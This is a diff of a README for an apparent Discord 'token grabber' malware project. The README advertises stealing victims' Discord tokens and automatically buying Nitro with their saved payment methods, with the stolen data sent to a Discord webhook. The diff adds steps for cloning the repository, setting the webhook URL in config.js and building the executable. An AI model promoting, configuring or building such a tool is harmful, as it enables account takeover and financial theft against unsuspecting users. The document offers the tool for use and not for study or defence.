@@ -1,5 +1,5 @@
 <div align="center">
-    <h1>Token Grabber</h1>
+    <h1>Grabber</h1>
     <small>(Didn't find a better name for it.)</small>
     <br/><br/>
     <a href="https://github.com/JustYuuto/Grabber/issues">
@@ -30,11 +30,20 @@ Items in bold are functionalities you can get hyped with!
 * **Can get Discord token (killing the Discord client is not needed)**
 * **Can auto-buy Nitro as soon as the user has launched the grabber** (only works if the user have a payment method attached to their Discord account)
 
-All that are sent to a Discord webhook. 
+All that are sent to a Discord webhook.
 
-## Building
+## Using it
 
-Use this command:
+First, you need to clone the repo and enter the repo directory:
+
+```bash
+git clone https://github.com/JustYuuto/Grabber.git
+cd Grabber
+```
+
+Then you need to configure the [``config.js``](config.js) file, like setting a webhook URL, changing the app name...
+
+When you're done with the configuration, you can build the exe file! Use this command to build it:
 
 ```bash
 yarn build
